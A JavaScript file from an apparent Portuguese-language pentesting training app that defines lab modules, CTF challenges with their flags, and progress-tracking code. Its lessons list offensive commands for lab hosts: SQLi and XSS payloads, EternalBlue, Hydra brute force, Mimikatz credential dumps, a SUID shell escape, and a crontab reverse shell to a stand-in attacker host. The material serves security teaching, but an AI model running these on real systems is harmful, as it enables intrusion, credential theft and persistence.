        // ── LAB (BETA) ──────────────────────────────────────────────────

        const LAB_MODULES = [
            {
                id: 'py',
                num: 'PY',
                icon: '🐍',
                name: 'Python para Cibersegurança',
                desc: 'Python contextualizado em segurança — scripts de ataque, defesa e automação de ferramentas.',
                tools: ['Python 3', 'socket', 'requests', 'subprocess', 'scapy'],
                xp: 300,
                alwaysAvailable: true,
                ctfFlag: 'flag{py_recon_script_done}',
                ctfTitle: 'Mini-Scanner de Reconhecimento',
                ctfDesc: 'Constrói um script Python que aceita um domínio como argumento, resolve DNS, testa portas comuns e gera um relatório `.txt`.',
                ctfObjective: 'Implementa o scanner completo (DNS + port scan + relatório .txt) e submete a flag de conclusão: `flag{py_recon_script_done}`',
                ctfHint: 'Usa `socket.getaddrinfo()` para DNS, `socket.connect_ex()` para portas e `requests.get()` para headers HTTP.',
                theory: {
                    concepts: [
                        'Python para segurança — porquê e como',
                        'Variáveis, tipos, condições, ciclos, funções',
                        'Módulo `os` e `subprocess` — executar comandos',
                        'Módulo `socket` — TCP/UDP e port scanning',
                        'Módulo `requests` — pedidos HTTP e análise de respostas',
                        'Módulo `scapy` — manipulação de pacotes de rede',
                    ],
                    resources: [
                        'Python Docs — socket module',
                        'Automate the Boring Stuff with Python',
                        'Black Hat Python (Justin Seitz)',
                        'realpython.com — Sockets in Python',
                    ],
                },
                steps: [
                    {
                        title: 'Unidade 1 — Primeiros passos',
                        desc: 'Variáveis, tipos, condições, ciclos e funções. Script que lê um IP e diz se é privado ou público.',
                        cmd: 'import ipaddress\nip = input("IP: ")\nobj = ipaddress.ip_address(ip)\nprint("Privado" if obj.is_private else "Público")',
                        xp: 40,
                    },
                    {
                        title: 'Unidade 2 — Ficheiros e strings',
                        desc: 'Ler ficheiros, manipular strings com regex. Parsear output do Nmap e extrair portas abertas.',
                        cmd: 'import re\nwith open("nmap_output.txt") as f:\n    for line in f:\n        m = re.search(r\'(\\d+)/tcp\\s+open\', line)\n        if m: print(f"Porta aberta: {m.group(1)}")',
                        xp: 50,
                    },
                    {
                        title: 'Unidade 3 — Módulos essenciais',
                        desc: 'os, subprocess, sys, requests. Script que faz GET a uma lista de URLs e reporta status codes.',
                        cmd: 'import requests\nurls = ["http://example.com", "http://httpbin.org/status/404"]\nfor url in urls:\n    r = requests.get(url, timeout=5)\n    print(f"{url} → {r.status_code}")',
                        xp: 50,
                    },
                    {
                        title: 'Unidade 4 — Redes com Python',
                        desc: 'Sockets TCP/UDP. Port scanner simples, depois com threading.',
                        cmd: 'import socket\ndef scan(host, port):\n    s = socket.socket()\n    s.settimeout(0.5)\n    return s.connect_ex((host, port)) == 0\nfor p in [21,22,80,443,3306]:\n    if scan("192.168.1.1", p): print(f"{p}/tcp open")',
                        xp: 60,
                    },
                    {
                        title: 'Unidade 5 — Automação de segurança',
                        desc: 'Automatizar Nmap, parsear XML, escrever relatório .txt.',
                        cmd: 'import subprocess, xml.etree.ElementTree as ET\nresult = subprocess.run(["nmap","-oX","out.xml","192.168.1.1"], capture_output=True)\ntree = ET.parse("out.xml")\nfor port in tree.findall(".//port[@protocol=\'tcp\']"):\n    print(port.get("portid"), port.find("state").get("state"))',
                        xp: 60,
                    },
                    {
                        title: 'Unidade 6 — Projecto final Python',
                        desc: 'Mini-scanner: DNS, port scan, HTTP headers, relatório .txt. Aceita domínio como argumento.',
                        cmd: 'python3 scanner.py target.com\n# Output: DNS records, open ports, HTTP headers → report.txt',
                        xp: 50,
                    },
                ],
            },
            {
                id: 'sql',
                num: 'SQL',
                icon: '🗄️',
                name: 'SQL para Cibersegurança',
                desc: 'SQL em contexto de segurança — perceber bases de dados para explorar e defender contra SQLi.',
                tools: ['MySQL', 'PostgreSQL', 'DVWA', 'pgAdmin', 'Supabase'],
                xp: 250,
                alwaysAvailable: true,
                ctfFlag: 'flag{sql_vuln_schema_done}',
                ctfTitle: 'Schema de Gestão de Vulnerabilidades',
                ctfDesc: 'Constrói o schema SQL completo de uma app de gestão de vulnerabilidades com 5 tabelas e escreve queries de análise.',
                ctfObjective: 'Cria as tabelas, insere dados de teste e executa a query de CVEs críticos dos últimos 30 dias.',
                ctfHint: 'Usa `WHERE severidade = \'critical\' AND criado_em >= NOW() - INTERVAL 30 DAY` na tabela `vulnerabilidades`.',
                theory: {
                    concepts: [
                        'Bases de dados relacionais — tabelas, colunas, tipos',
                        'SELECT, FROM, WHERE, ORDER BY, LIMIT',
                        'INSERT, UPDATE, DELETE, CREATE TABLE, DROP TABLE',
                        'JOINs (INNER, LEFT, RIGHT) e subqueries',
                        'GROUP BY, HAVING e funções de agregação',
                        'SQL Injection — como funciona e como prevenir',
                    ],
                    resources: [
                        'SQLZoo — aprender SQL interactivo',
                        'OWASP SQL Injection Prevention Cheat Sheet',
                        'PostgreSQL Documentation',
                        'HackTricks — SQL Injection',
                    ],
                },
                steps: [
                    {
                        title: 'Unidade 1 — Fundamentos',
                        desc: 'SELECT, WHERE, ORDER BY, LIMIT. Consultar base de dados de utilizadores fictícia.',
                        cmd: 'SELECT username, email FROM users\nWHERE role = \'admin\'\nORDER BY created_at DESC\nLIMIT 10;',
                        xp: 30,
                    },
                    {
                        title: 'Unidade 2 — Manipulação de dados',
                        desc: 'INSERT, UPDATE, DELETE, CREATE TABLE. Criar tabela de logs de acesso.',
                        cmd: 'CREATE TABLE access_logs (\n  id INT AUTO_INCREMENT PRIMARY KEY,\n  ip VARCHAR(45),\n  username VARCHAR(100),\n  success BOOLEAN,\n  timestamp DATETIME DEFAULT NOW()\n);\nINSERT INTO access_logs (ip, username, success)\nVALUES (\'192.168.1.100\', \'admin\', FALSE);',
                        xp: 40,
                    },
                    {
                        title: 'Unidade 3 — Queries avançadas',
                        desc: 'JOINs, agregação, GROUP BY. Relatório de vendas por produto — ou no nosso caso, CVEs por target.',
                        cmd: 'SELECT t.dominio, COUNT(v.id) as total_vulns,\n       SUM(CASE WHEN v.severidade=\'critical\' THEN 1 ELSE 0 END) as criticos\nFROM targets t\nJOIN scans s ON s.target_id = t.id\nJOIN vulnerabilidades v ON v.scan_id = s.id\nGROUP BY t.dominio\nORDER BY criticos DESC;',
                        xp: 50,
                    },
                    {
                        title: 'Unidade 4 — SQL em contexto de segurança',
                        desc: 'Como SQLi funciona. Payloads básicos no DVWA e como prepared statements previnem.',
                        cmd: "-- Payload vulnerável:\nSELECT * FROM users WHERE username='$input';\n-- Com input: ' OR '1'='1\n-- Resultado: devolve todos os utilizadores\n\n-- Versão segura (prepared statement):\nSELECT * FROM users WHERE username = ?;",
                        xp: 50,
                    },
                    {
                        title: 'Unidade 5 — Análise de logs com SQL',
                        desc: 'Detectar brute force por SQL: IPs repetidos, logins falhados, horários anómalos.',
                        cmd: 'SELECT ip, COUNT(*) as tentativas,\n       MIN(timestamp) as primeira,\n       MAX(timestamp) as ultima\nFROM access_logs\nWHERE success = FALSE\n  AND timestamp >= NOW() - INTERVAL 1 HOUR\nGROUP BY ip\nHAVING tentativas > 10\nORDER BY tentativas DESC;',
                        xp: 50,
                    },
                    {
                        title: 'Unidade 6 — Projecto final SQL',
                        desc: 'Schema completo de gestão de vulnerabilidades: 5 tabelas + queries de relatório.',
                        cmd: '-- targets, scans, vulnerabilidades, utilizadores, relatorios\nCREATE TABLE vulnerabilidades (\n  id INT PRIMARY KEY AUTO_INCREMENT,\n  scan_id INT, cve VARCHAR(20),\n  severidade ENUM(\'info\',\'low\',\'medium\',\'high\',\'critical\'),\n  descricao TEXT, remediacao TEXT\n);',
                        xp: 30,
                    },
                ],
            },
            {
                id: 'recon',
                num: '01',
                icon: '🔍',
                name: 'Reconhecimento',
                desc: 'OSINT, DNS enumeration, subdomain discovery e footprinting activo e passivo.',
                tools: ['Nmap', 'theHarvester', 'Shodan', 'amass', 'dnsx', 'reNgine', 'Google Dorks'],
                xp: 200,
                ctfFlag: 'flag{recon_hidden_sub_found}',
                ctfTitle: 'Subdomain Hunter',
                ctfDesc: 'Num alvo simulado (`target.pentestlab.local`), descobre o subdomínio oculto que serve um painel de administração não documentado. Usa passive OSINT e DNS enumeration.',
                ctfObjective: 'Encontra o subdomínio admin e submete a flag que está na página inicial do painel.',
                ctfHint: 'Tenta enumerar com `amass enum -d target.pentestlab.local` ou dá uma olhada ao certificado TLS com `curl -v`.',
                theory: {
                    concepts: [
                        'Footprinting passivo vs activo',
                        'Google Dorks: operadores `site:`, `filetype:`, `inurl:`',
                        'DNS: registos A, MX, TXT, NS, CNAME',
                        'Subdomain enumeration por força bruta',
                        'OSINT com LinkedIn, Shodan, Censys',
                        'Metadata extraction em PDFs e imagens',
                    ],
                    resources: [
                        'OSINT Framework — osintframework.com',
                        'Shodan Dorks Cheatsheet',
                        'Nmap Reference Guide',
                        'amass documentation',
                    ],
                },
                steps: [
                    {
                        title: 'Passive OSINT',
                        desc: 'Recolhe informação sem tocar no alvo. LinkedIn, Shodan, Censys, WHOIS.',
                        cmd: 'theHarvester -d target.com -b google,linkedin,shodan',
                        xp: 30,
                    },
                    {
                        title: 'DNS Enumeration',
                        desc: 'Descobre registos DNS do domínio alvo com dnsx e amass.',
                        cmd: 'dnsx -d target.com -a -txt -mx -resp\namass enum -d target.com -passive',
                        xp: 30,
                    },
                    {
                        title: 'Nmap — tipos de scan',
                        desc: 'Aprende as flags essenciais: SYN scan, versão, scripts NSE.',
                        cmd: 'nmap -sV -sC -p- --min-rate 5000 192.168.1.1',
                        xp: 40,
                    },
                    {
                        title: 'Google Dorks',
                        desc: 'Encontra exposures com operadores avançados no Google.',
                        cmd: 'site:target.com filetype:pdf\nsite:target.com inurl:admin',
                        xp: 30,
                    },
                    {
                        title: 'Metadata Extraction',
                        desc: 'Extrai metadata de documentos para descobrir nomes de utilizadores e caminhos internos.',
                        cmd: 'exiftool documento.pdf\nmetagoofil -d target.com -t pdf,docx -o output/',
                        xp: 30,
                    },
                    {
                        title: 'reNgine — Pipeline automatizado',
                        desc: 'Corre um pipeline completo de reconhecimento web com reNgine: subdomain enum, port scan, screenshot, vulnerability scan.',
                        cmd: '# reNgine (self-hosted)\n# 1. Cria um alvo em /targets/\n# 2. Escolhe um scan engine: "Full Scan"\n# 3. Agenda ou corre imediatamente\n# Resultados: subdomínios, endpoints, tecnologias, CVEs',
                        xp: 40,
                    },
                ],
            },
            {
                id: 'webapp',
                num: '02',
                icon: '🌐',
                name: 'Web Application',
                desc: 'Vulnerabilidades web baseadas no OWASP Top 10.',
                tools: ['Burp Suite', 'SQLmap', 'DVWA', 'WebGoat', 'CyberChef', 'OWASP ZAP'],
                xp: 250,
                ctfFlag: 'flag{dvwa_compromised_admin}',
                ctfTitle: 'DVWA Full Compromise',
                ctfDesc: 'A instância DVWA está disponível em `http://dvwa.pentestlab.local`. Compromete a aplicação completa — começa com SQLi, escala para RCE.',
                ctfObjective: 'Obtém acesso à flag guardada em `/var/www/flag.txt` através de SQLi ou RCE.',
                ctfHint: 'Começa com SQLi no login. Depois tenta upload de webshell na secção File Upload. Certifica que o nível de segurança está em "Low".',
                theory: {
                    concepts: [
                        'OWASP Top 10 — overview das categorias',
                        'SQL Injection: union-based, blind, time-based',
                        'XSS: reflected, stored, DOM-based',
                        'IDOR — Insecure Direct Object Reference',
                        'SSRF — Server-Side Request Forgery',
                        'Burp Suite: intercept, repeater, intruder',
                    ],
                    resources: [
                        'OWASP Web Security Testing Guide',
                        'PortSwigger Web Academy',
                        'PayloadsAllTheThings — SQL Injection',
                        'HackTricks Web Pentesting',
                    ],
                },
                steps: [
                    {
                        title: 'SQLi básico — DVWA',
                        desc: 'Explora o formulário de login com payloads básicos.',
                        cmd: "' OR '1'='1\n' OR 1=1 --\nadmin'--",
                        xp: 40,
                    },
                    {
                        title: 'SQLi avançado com SQLmap',
                        desc: 'Automatiza a extracção de dados com SQLmap.',
                        cmd: 'sqlmap -u "http://dvwa.local/vuln.php?id=1" --dbs --batch',
                        xp: 40,
                    },
                    {
                        title: 'XSS Reflected & Stored',
                        desc: 'Injeta scripts em campos de formulário e vê a execução.',
                        cmd: '<script>alert(document.cookie)<\\/script>\n<img src=x onerror=alert(1)>',
                        xp: 40,
                    },
                    {
                        title: 'Burp Suite — Intercept & Repeater',
                        desc: 'Configura o proxy, intercepta requests e modifica parâmetros.',
                        cmd: '# Proxy: 127.0.0.1:8080\n# Intercept ON → modifica parâmetro → Forward',
                        xp: 40,
                    },
                    {
                        title: 'IDOR — Broken Access Control',
                        desc: 'Acede a recursos de outros utilizadores manipulando IDs.',
                        cmd: 'GET /user/profile?id=2  →  id=1, id=0, id=admin',
                        xp: 40,
                    },
                    {
                        title: 'CyberChef — Decode & Analyse',
                        desc: 'Usa CyberChef para descodificar tokens JWT, cookies Base64, payloads ofuscados e hashes.',
                        cmd: '# Receitas úteis em CyberChef:\n# "From Base64" → descodifica cookies\n# "JWT Decode" → lê claims sem verificar assinatura\n# "URL Decode" → desofusca query strings\n# "Magic" → detecta automaticamente o encoding',
                        xp: 30,
                    },
                ],
            },
            {
                id: 'network',
                num: '03',
                icon: '🕸️',
                name: 'Redes e Infra',
                desc: 'Port scanning, sniffing e exploração de serviços de rede.',
                tools: ['Wireshark', 'Metasploit', 'Ettercap', 'Hydra', 'Nmap'],
                xp: 300,
                ctfFlag: 'flag{ftp_anon_root_access}',
                ctfTitle: 'Anonymous FTP',
                ctfDesc: 'A máquina `192.168.56.101` tem um serviço FTP vulnerável com login anónimo activo. Encontra a flag guardada no servidor.',
                ctfObjective: 'Acede via FTP anónimo e lê o ficheiro `/flag.txt`.',
                ctfHint: 'Tenta `ftp 192.168.56.101` com user `anonymous` e qualquer password. Usa `ls -la` para ver ficheiros ocultos.',
                theory: {
                    concepts: [
                        'Modelo OSI e TCP/IP — camadas relevantes',
                        'ARP — Address Resolution Protocol e poisoning',
                        'Man-in-the-Middle — interceptação de tráfego',
                        'Metasploit: módulos, payloads, sessions',
                        'Brute force de credenciais com Hydra',
                        'Banner grabbing e fingerprinting de serviços',
                    ],
                    resources: [
                        'Metasploit Unleashed',
                        'Wireshark User Guide',
                        'Nmap Network Scanning Book',
                        'HackTricks — Network Services',
                    ],
                },
                steps: [
                    {
                        title: 'ARP Spoofing com Ettercap',
                        desc: 'Posiciona-te no meio da comunicação entre dois hosts.',
                        cmd: 'ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.100//',
                        xp: 50,
                    },
                    {
                        title: 'Sniffing com Wireshark',
                        desc: 'Captura e analisa tráfego de rede em tempo real.',
                        cmd: '# Filtros úteis:\nhttp.request\nftp\nsmtp\ntcp.port == 80',
                        xp: 50,
                    },
                    {
                        title: 'Exploração SMB — EternalBlue',
                        desc: 'Usa o Metasploit para explorar MS17-010 numa VM vulnerável.',
                        cmd: 'msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.56.102\nrun',
                        xp: 60,
                    },
                    {
                        title: 'Brute Force SSH com Hydra',
                        desc: 'Ataca serviços SSH com dicionário de passwords.',
                        cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101',
                        xp: 50,
                    },
                    {
                        title: 'Banner Grabbing',
                        desc: 'Identifica versões de serviços em portas abertas.',
                        cmd: 'nc -nv 192.168.56.101 21\nnmap -sV --script=banner 192.168.56.101',
                        xp: 40,
                    },
                ],
            },
            {
                id: 'postexploit',
                num: '04',
                icon: '🔓',
                name: 'Pós-exploração',
                desc: 'Privilege escalation, persistência e movimentação lateral.',
                tools: ['LinPEAS', 'WinPEAS', 'Mimikatz', 'Chisel'],
                xp: 350,
                ctfFlag: 'flag{privesc_root_via_suid}',
                ctfTitle: 'Root via SUID',
                ctfDesc: 'Tens acesso SSH como user `lowpriv` na máquina `192.168.56.103`. Escala para root através de uma misconfiguration SUID.',
                ctfObjective: 'Obtém shell de root e lê `/root/flag.txt`.',
                ctfHint: 'Corre `find / -perm -4000 2>/dev/null` e verifica os binários com SUID. Consulta GTFOBins para vectores de escalada.',
                theory: {
                    concepts: [
                        'Linux privesc: SUID, sudo -l, cron jobs, PATH hijack',
                        'Windows privesc: token impersonation, AlwaysInstallElevated',
                        'Meterpreter: comandos básicos e módulos de post',
                        'Dump de credenciais com Mimikatz',
                        'Pivoting: SSH tunnels e Chisel',
                        'Persistência: crontab, .bashrc, serviços',
                    ],
                    resources: [
                        'GTFOBins — gtfobins.github.io',
                        'PayloadsAllTheThings — Privilege Escalation',
                        'HackTricks Linux Privesc',
                        'Mimikatz Documentation',
                    ],
                },
                steps: [
                    {
                        title: 'Linux Privesc com LinPEAS',
                        desc: 'Corre LinPEAS para enumerar vectores de escalada automaticamente.',
                        cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
                        xp: 60,
                    },
                    {
                        title: 'SUID Exploitation',
                        desc: 'Encontra binários com SUID e explora-os via GTFOBins.',
                        cmd: 'find / -perm -4000 -type f 2>/dev/null\n# Exemplo com find:\nfind . -exec /bin/sh -p \\; -quit',
                        xp: 70,
                    },
                    {
                        title: 'Dump de Credenciais com Mimikatz',
                        desc: 'Extrai hashes e passwords em plaintext da memória do Windows.',
                        cmd: 'privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam',
                        xp: 70,
                    },
                    {
                        title: 'Pivoting com Chisel',
                        desc: 'Cria um túnel para alcançar redes internas.',
                        cmd: '# Servidor (atacante):\n./chisel server -p 8080 --reverse\n# Cliente (alvo):\n./chisel client ATACANTE:8080 R:3306:192.168.1.10:3306',
                        xp: 70,
                    },
                    {
                        title: 'Persistência via Crontab',
                        desc: 'Instala persistência num sistema Linux comprometido.',
                        cmd: '(crontab -l; echo "@reboot /bin/bash -c \'/bin/bash -i >& /dev/tcp/ATACANTE/4444 0>&1\'") | crontab -',
                        xp: 50,
                    },
                ],
            },
            {
                id: 'report',
                num: '05',
                icon: '📋',
                name: 'Relatório Profissional',
                desc: 'Documentação de vulnerabilidades com scoring CVSS v3.1.',
                tools: ['CVSS Calculator', 'Markdown', 'PDF Export'],
                xp: 150,
                ctfFlag: null,
                ctfTitle: null,
                ctfDesc: null,
                ctfObjective: null,
                ctfHint: null,
                theory: {
                    concepts: [
                        'Estrutura de um relatório de pentest profissional',
                        'Executive Summary — para gestão não técnica',
                        'CVSS v3.1: Base Score, Vector String, métricas',
                        'Findings — descrição, evidência, impacto, remediação',
                        'CVSS: AV, AC, PR, UI, S, C, I, A',
                        'Exemplo: SQLi crítico → CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
                    ],
                    resources: [
                        'CVSS v3.1 Calculator — first.org/cvss/calculator/3.1',
                        'OWASP Testing Guide — Report Format',
                        'Template de Relatório (ver secção Labs)',
                        'Exemplo de relatório HackerOne',
                    ],
                },
                steps: [
                    {
                        title: 'Executive Summary',
                        desc: 'Escreve um resumo executivo de 1 página para gestão não técnica. Foca em risco e impacto.',
                        cmd: '# Secções: Âmbito, Metodologia, Resumo de Findings, Recomendações',
                        xp: 30,
                    },
                    {
                        title: 'Calcular CVSS Score',
                        desc: 'Para cada finding, calcula o CVSS v3.1 Base Score e justifica as métricas escolhidas.',
                        cmd: '# AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n# Base Score: 9.8 — Critical',
                        xp: 40,
                    },
                    {
                        title: 'Documentar Finding',
                        desc: 'Estrutura cada vulnerabilidade: título, descrição, evidência (screenshot/req), impacto, remediação.',
                        cmd: '## SQL Injection — Login Form\n**Severidade:** Critical (CVSS 9.8)\n**Evidência:** `\' OR 1=1--` retornou dados de todos os users\n**Remediação:** Usar prepared statements',
                        xp: 40,
                    },
                    {
                        title: 'Remediação e Follow-up',
                        desc: 'Define recomendações concretas por finding, com prioridade e timeline sugerida.',
                        cmd: '# Prioridade: Critical → remediar em 24-48h\n# High → 1 semana\n# Medium → 30 dias',
                        xp: 20,
                    },
                    {
                        title: 'Export PDF',
                        desc: 'Exporta o relatório para PDF com formatação profissional.',
                        cmd: 'pandoc relatorio.md -o relatorio.pdf --template pentestlab',
                        xp: 20,
                    },
                ],
            },
            {
                id: 'ctf-arena',
                num: '06',
                icon: '🏴',
                name: 'CTF Arena',
                desc: 'Desafios autónomos por nível de dificuldade. Flags reais em ambientes isolados.',
                tools: ['Todos os anteriores'],
                xp: 500,
                ctfFlag: null,
                isArena: true,
                theory: {
                    concepts: [
                        'Estratégia CTF: recon primeiro, sempre',
                        'Categorias: Web, Crypto, Forensics, Pwn, Misc',
                        'Writeups: aprende com soluções de outros',
                        'CTF tools: pwntools, CyberChef, strings, ltrace, strace',
                        'Time management: não ficar preso num desafio',
                    ],
                    resources: [
                        'CTFtime.org — calendário de competições',
                        'PicoCTF — challenges para iniciantes',
                        'OverTheWire — Bandit, Natas',
                        'HackTheBox Starting Point',
                    ],
                },
                steps: [],
                arenaChalls: [
                    { id: 'c1', title: 'Baby SQLi', type: 'Web', diff: 'easy', xp: 50, flag: 'flag{baby_sqli_done}', desc: 'Formulário de login simples. Um único payload resolve.' },
                    { id: 'c2', title: 'XSS Cookie Stealer', type: 'Web', diff: 'easy', xp: 50, flag: 'flag{cookie_stolen}', desc: 'Injeta XSS stored e captura o cookie de admin.' },
                    { id: 'c3', title: 'FTP Anonymous', type: 'Network', diff: 'easy', xp: 50, flag: 'flag{ftp_anon_flag}', desc: 'Acede ao FTP com login anónimo e lê a flag.' },
                    { id: 'c4', title: 'Directory Traversal', type: 'Web', diff: 'medium', xp: 150, flag: 'flag{traversal_etc_passwd}', desc: 'Lê `/etc/passwd` via path traversal no parâmetro `file`.' },
                    { id: 'c5', title: 'SUID Escape', type: 'Privesc', diff: 'medium', xp: 150, flag: 'flag{suid_root_shell}', desc: 'Usa um binário com SUID mal configurado para obter root.' },
                    { id: 'c6', title: 'SMB EternalBlue', type: 'Network', diff: 'medium', xp: 150, flag: 'flag{eternalblue_pwned}', desc: 'Explora MS17-010 com Metasploit numa VM Windows XP.' },
                    { id: 'c7', title: 'Full Chain: Recon → RCE', type: 'Full', diff: 'hard', xp: 300, flag: 'flag{full_chain_rce}', desc: 'Recon → SQLi → File Upload → RCE → Root. Máquina completa.' },
                    { id: 'c8', title: 'AD Kerberoasting', type: 'ActiveDirectory', diff: 'hard', xp: 300, flag: 'flag{kerberoast_cracked}', desc: 'Enumera SPN accounts e quebra o ticket com hashcat.' },
                ],
            },
        ];

        // ── State ─────────────────────────────────────────────────────────
        let _labProgress = {};
        let _labActiveModule = null;
        let _labActiveTab = 'teoria';

        function labLoadProgress() {
            try {
                _labProgress = JSON.parse(localStorage.getItem('lab_progress') || '{}');
            } catch { _labProgress = {}; }
        }

        function labSaveProgress() {
            localStorage.setItem('lab_progress', JSON.stringify(_labProgress));
        }

        function labGetModuleProgress(moduleId) {
            return _labProgress[moduleId] || { steps: {}, ctfSolved: false, ctfArena: {} };
        }

        function labCalcModulePct(mod) {
            const p = labGetModuleProgress(mod.id);
            if (mod.isArena) {
                const total = mod.arenaChalls.length;
                const done = mod.arenaChalls.filter(c => p.ctfArena && p.ctfArena[c.id]).length;
                return total > 0 ? Math.round((done / total) * 100) : 0;
            }
            const total = mod.steps.length + (mod.ctfFlag ? 1 : 0);
            const done = Object.keys(p.steps || {}).length + (p.ctfSolved ? 1 : 0);
            return total > 0 ? Math.round((done / total) * 100) : 0;
        }

        function labTotalXP() {
            let xp = 0;
            LAB_MODULES.forEach(mod => {
                const p = labGetModuleProgress(mod.id);
                mod.steps.forEach((s, i) => { if (p.steps && p.steps[i]) xp += s.xp; });
                if (p.ctfSolved && mod.ctfFlag) xp += 100;
                if (mod.isArena && mod.arenaChalls) {
                    mod.arenaChalls.forEach(c => { if (p.ctfArena && p.ctfArena[c.id]) xp += c.xp; });
                }
            });
            return xp;
        }

        function labMaxXP() {
            let xp = 0;
            LAB_MODULES.forEach(mod => {
                mod.steps.forEach(s => xp += s.xp);
                if (mod.ctfFlag) xp += 100;
                if (mod.isArena && mod.arenaChalls) mod.arenaChalls.forEach(c => xp += c.xp);
            });
            return xp;
        }

        function labModuleStatus(mod, idx) {
            const pct = labCalcModulePct(mod);
            if (pct === 100) return 'done';
            if (pct > 0) return 'progress';
            if (mod.alwaysAvailable) return 'available';
            const pentest = LAB_MODULES.filter(m => !m.alwaysAvailable);
            const pentestIdx = pentest.indexOf(mod);
            if (pentestIdx === 0) return 'available';
            const prevMod = pentest[pentestIdx - 1];
            if (prevMod && labCalcModulePct(prevMod) >= 50) return 'available';
            return 'locked';
        }

        // ── Render ────────────────────────────────────────────────────────
        function labRender() {
            labLoadProgress();
            const el = document.getElementById('view-lab');
            if (!el) return;

            const totalXP = labTotalXP();
            const maxXP = labMaxXP();
            const xpPct = maxXP > 0 ? Math.round((totalXP / maxXP) * 100) : 0;

            const completedMods = LAB_MODULES.filter(m => labCalcModulePct(m) === 100).length;
            const ctfsSolved = LAB_MODULES.reduce((acc, m) => {
                const p = labGetModuleProgress(m.id);
                return acc + (p.ctfSolved ? 1 : 0);
            }, 0);

            const byId = id => LAB_MODULES.find(m => m.id === id);
            const badges = [
                { icon: '🐍', label: 'Pythonista', earned: labCalcModulePct(byId('py')) === 100 },
                { icon: '🗄️', label: 'SQL Ninja', earned: labCalcModulePct(byId('sql')) === 100 },
                { icon: '🔍', label: 'OSINT Pro', earned: labCalcModulePct(byId('recon')) === 100 },
                { icon: '🌐', label: 'Web Hacker', earned: labCalcModulePct(byId('webapp')) === 100 },
                { icon: '🕸️', label: 'Network Op', earned: labCalcModulePct(byId('network')) === 100 },
                { icon: '🔓', label: 'Privesc Master', earned: labCalcModulePct(byId('postexploit')) === 100 },
                { icon: '📋', label: 'Repórter', earned: labCalcModulePct(byId('report')) === 100 },
                { icon: '🏴', label: 'CTF Finisher', earned: labCalcModulePct(byId('ctf-arena')) === 100 },
            ];

            el.innerHTML = `
<div class="lab-header">
  <div class="lab-header-left">
    <div class="lab-title">// PentestLab</div>
    <div class="lab-subtitle">Aprende pentesting praticando. Cada módulo desbloqueia o seguinte.</div>
  </div>
  <div class="lab-xp-bar-wrap">
    <div class="lab-xp-label">XP Total</div>
    <div class="lab-xp-value">${totalXP} <span style="font-size:0.9rem;opacity:0.6">/ ${maxXP}</span></div>
    <div class="lab-xp-progress-track">
      <div class="lab-xp-progress-fill" style="width:${xpPct}%"></div>
    </div>
  </div>
</div>

<div class="lab-stats-row">
  <div class="lab-stat-card">
    <div class="lab-stat-value">${completedMods}</div>
    <div class="lab-stat-label">Módulos completos</div>
  </div>
  <div class="lab-stat-card">
    <div class="lab-stat-value">${ctfsSolved}</div>
    <div class="lab-stat-label">CTFs resolvidos</div>
  </div>
  <div class="lab-stat-card">
    <div class="lab-stat-value">${totalXP}</div>
    <div class="lab-stat-label">XP ganho</div>
  </div>
  <div class="lab-stat-card">
    <div class="lab-stat-value">${xpPct}%</div>
    <div class="lab-stat-label">Progresso geral</div>
  </div>
</div>

<div class="lab-badges">
  ${badges.map(b => `<div class="lab-badge${b.earned ? ' earned' : ''}"><span class="lab-badge-icon">${b.icon}</span>${b.label}</div>`).join('')}
</div>

<div id="lab-detail-container"></div>

<div class="lab-section-label">// Fundamentos</div>
<div class="lab-modules-grid">
  ${LAB_MODULES.filter(m => m.alwaysAvailable).map((mod, idx) => labRenderModuleCard(mod, idx)).join('')}
</div>

<div class="lab-section-label" style="margin-top:1.5rem;">// Pentesting</div>
<div class="lab-modules-grid">
  ${LAB_MODULES.filter(m => !m.alwaysAvailable).map((mod, idx) => labRenderModuleCard(mod, LAB_MODULES.indexOf(mod))).join('')}
</div>
            `;

            if (_labActiveModule) {
                labShowDetail(_labActiveModule);
            }
        }

        function labStatusLabel(status) {
            const map = { locked: 'Bloqueado', available: 'Disponível', progress: 'Em progresso', done: 'Completo' };
            return map[status] || status;
        }

        function labRenderModuleCard(mod, idx) {
            const status = labModuleStatus(mod, idx);
            const pct = labCalcModulePct(mod);
            const p = labGetModuleProgress(mod.id);
            const stepsDone = Object.keys(p.steps || {}).length;
            const ctfSolved = p.ctfSolved;

            return `
<div class="lab-module-card ${status}${_labActiveModule === mod.id ? ' active' : ''}"
     onclick="labOpenModule('${mod.id}')">
  <div class="lab-module-top">
    <span class="lab-module-icon">${status === 'locked' ? '🔒' : mod.icon}</span>
    <span class="lab-module-status status-${status}">${labStatusLabel(status)}</span>
  </div>
  <div class="lab-module-num">Módulo ${mod.num}</div>
  <div class="lab-module-name">${mod.name}</div>
  <div class="lab-module-desc">${mod.desc}</div>
  <div class="lab-module-tools">
    ${mod.tools.slice(0, 4).map(t => `<span class="lab-tool-tag">${t}</span>`).join('')}
    ${mod.tools.length > 4 ? `<span class="lab-tool-tag">+${mod.tools.length - 4}</span>` : ''}
  </div>
  <div class="lab-module-progress-row">
    <span class="lab-module-progress-label">Progresso</span>
    <span class="lab-module-progress-pct">${pct}%</span>
  </div>
  <div class="lab-module-progress-track">
    <div class="lab-module-progress-fill" style="width:${pct}%"></div>
  </div>
  <div class="lab-module-meta">
    ${!mod.isArena ? `<span class="lab-module-meta-item">Labs: <span>${stepsDone}/${mod.steps.length}</span></span>` : ''}
    ${mod.ctfFlag ? `<span class="lab-module-meta-item">CTF: <span>${ctfSolved ? '✓' : '–'}</span></span>` : ''}
    <span class="lab-module-meta-item">XP: <span>${mod.xp}</span></span>
  </div>
</div>
            `;
        }

        function labOpenModule(moduleId) {
            const mod = LAB_MODULES.find(m => m.id === moduleId);
            if (!mod) return;
            const idx = LAB_MODULES.indexOf(mod);
            const status = labModuleStatus(mod, idx);
            if (status === 'locked') {
                labToast('Completa o módulo anterior para desbloquear.', 'error');
                return;
            }
            _labActiveModule = _labActiveModule === moduleId ? null : moduleId;
            _labActiveTab = 'teoria';
            labRender();
            setTimeout(() => {
                const dc = document.getElementById('lab-detail-container');
